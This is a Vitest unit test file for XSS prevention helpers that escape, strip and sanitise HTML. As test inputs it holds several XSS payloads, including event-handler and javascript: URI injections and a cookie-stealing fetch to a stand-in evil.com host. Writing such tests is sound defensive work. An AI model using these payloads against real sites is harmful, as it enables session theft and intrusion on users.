/**
 * Unit tests for XSS prevention utilities.
 *
 * Tests:
 *   - escapeHtml(): HTML character escaping
 *   - sanitiseHtml(): DOMPurify-based HTML sanitisation
 *   - stripAllTags(): fallback tag stripping
 *   - safeHtml(): dangerouslySetInnerHTML helper
 *
 * Requirements: 11.5, 11.6
 */

import { describe, it, expect } from 'vitest';
import {
  escapeHtml,
  sanitiseHtml,
  stripAllTags,
  safeHtml,
} from '../xssPrevention';

// ─── escapeHtml ───────────────────────────────────────────────────────────────

describe('escapeHtml()', () => {
  it('escapes ampersands', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b');
  });

  it('escapes less-than signs', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
  });

  it('escapes greater-than signs', () => {
    expect(escapeHtml('a > b')).toBe('a &gt; b');
  });

  it('escapes double quotes', () => {
    expect(escapeHtml('"hello"')).toBe('&quot;hello&quot;');
  });

  it('escapes single quotes', () => {
    expect(escapeHtml("it's")).toBe('it&#x27;s');
  });

  it('escapes a full XSS payload', () => {
    const payload = '<img src=x onerror="alert(\'XSS\')">';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&lt;');
    expect(escaped).toContain('&gt;');
    expect(escaped).toContain('&quot;');
  });

  it('returns an empty string for non-string input', () => {
    // @ts-expect-error — testing runtime behaviour with wrong type
    expect(escapeHtml(null)).toBe('');
    // @ts-expect-error
    expect(escapeHtml(undefined)).toBe('');
    // @ts-expect-error
    expect(escapeHtml(42)).toBe('');
  });

  it('returns an empty string for an empty input', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('leaves safe text unchanged', () => {
    const safe = 'Hello, World! This is a resume summary.';
    expect(escapeHtml(safe)).toBe(safe);
  });

  it('escapes all five special characters in one string', () => {
    const input = `<div class="test" id='foo'>a & b</div>`;
    const result = escapeHtml(input);
    // After escaping, no raw < > " ' should remain (& is used in entity refs)
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toContain('"');
    expect(result).not.toContain("'");
    // All five entities must be present
    expect(result).toContain('&lt;');
    expect(result).toContain('&gt;');
    expect(result).toContain('&quot;');
    expect(result).toContain('&#x27;');
    expect(result).toContain('&amp;');
  });

  it('escapes multiple occurrences of the same character', () => {
    expect(escapeHtml('a < b < c')).toBe('a &lt; b &lt; c');
  });
});

// ─── stripAllTags ─────────────────────────────────────────────────────────────

describe('stripAllTags()', () => {
  it('removes simple HTML tags', () => {
    expect(stripAllTags('<p>Hello</p>')).toBe('Hello');
  });

  it('removes script tags', () => {
    const result = stripAllTags('<script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
  });

  it('removes nested tags', () => {
    expect(stripAllTags('<div><strong>Bold</strong> text</div>')).toBe('Bold text');
  });

  it('decodes common HTML entities', () => {
    expect(stripAllTags('&amp;')).toBe('&');
    expect(stripAllTags('&lt;')).toBe('<');
    expect(stripAllTags('&gt;')).toBe('>');
    expect(stripAllTags('&quot;')).toBe('"');
    expect(stripAllTags('&#x27;')).toBe("'");
    expect(stripAllTags('&nbsp;')).toBe(' ');
  });

  it('returns plain text unchanged', () => {
    const text = 'Hello, World!';
    expect(stripAllTags(text)).toBe(text);
  });

  it('handles empty string', () => {
    expect(stripAllTags('')).toBe('');
  });
});

// ─── sanitiseHtml ─────────────────────────────────────────────────────────────

describe('sanitiseHtml()', () => {
  it('returns an empty string for empty input', () => {
    expect(sanitiseHtml('')).toBe('');
    expect(sanitiseHtml('   ')).toBe('');
  });

  it('returns an empty string for non-string input', () => {
    // @ts-expect-error — testing runtime behaviour
    expect(sanitiseHtml(null)).toBe('');
    // @ts-expect-error
    expect(sanitiseHtml(undefined)).toBe('');
  });

  it('removes script tags from HTML', () => {
    const result = sanitiseHtml('<p>Hello</p><script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
  }, 10000);

  it('removes inline event handlers', () => {
    const result = sanitiseHtml('<p onclick="alert(1)">Click me</p>');
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('alert');
  });

  it('removes javascript: URIs from href attributes', () => {
    const result = sanitiseHtml('<a href="javascript:alert(1)">Click</a>');
    expect(result).not.toContain('javascript:');
  });

  it('preserves safe allowed tags', () => {
    const input = '<p>Hello <strong>world</strong></p>';
    const result = sanitiseHtml(input);
    expect(result).toContain('<p>');
    expect(result).toContain('<strong>');
    expect(result).toContain('Hello');
    expect(result).toContain('world');
  });

  it('preserves safe anchor tags with http href', () => {
    const input = '<a href="https://example.com">Link</a>';
    const result = sanitiseHtml(input);
    expect(result).toContain('href');
    expect(result).toContain('https://example.com');
  });

  it('removes iframe tags', () => {
    const result = sanitiseHtml('<iframe src="https://evil.com"></iframe>');
    expect(result).not.toContain('<iframe');
  });

  it('removes object and embed tags', () => {
    const result = sanitiseHtml('<object data="evil.swf"></object><embed src="evil.swf">');
    expect(result).not.toContain('<object');
    expect(result).not.toContain('<embed');
  });

  it('removes style tags', () => {
    const result = sanitiseHtml('<style>body { display: none }</style><p>Content</p>');
    expect(result).not.toContain('<style>');
  });

  it('handles a complex XSS payload', () => {
    const payload = `
      <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
      <svg onload="alert(1)">
      <script>document.write('<img src=x onerror=alert(1)>')</script>
      <p>Legitimate content</p>
    `;
    const result = sanitiseHtml(payload);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('onload');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('document.cookie');
    expect(result).toContain('Legitimate content');
  });
});

// ─── safeHtml ─────────────────────────────────────────────────────────────────

describe('safeHtml()', () => {
  it('returns an object with dangerouslySetInnerHTML.__html', () => {
    const result = safeHtml('<p>Hello</p>');
    expect(result).toHaveProperty('dangerouslySetInnerHTML');
    expect(result.dangerouslySetInnerHTML).toHaveProperty('__html');
    expect(typeof result.dangerouslySetInnerHTML.__html).toBe('string');
  });

  it('sanitises the HTML before returning', () => {
    const result = safeHtml('<p>Safe</p><script>alert(1)</script>');
    expect(result.dangerouslySetInnerHTML.__html).not.toContain('<script>');
    expect(result.dangerouslySetInnerHTML.__html).toContain('Safe');
  });

  it('returns empty __html for empty input', () => {
    const result = safeHtml('');
    expect(result.dangerouslySetInnerHTML.__html).toBe('');
  });
});
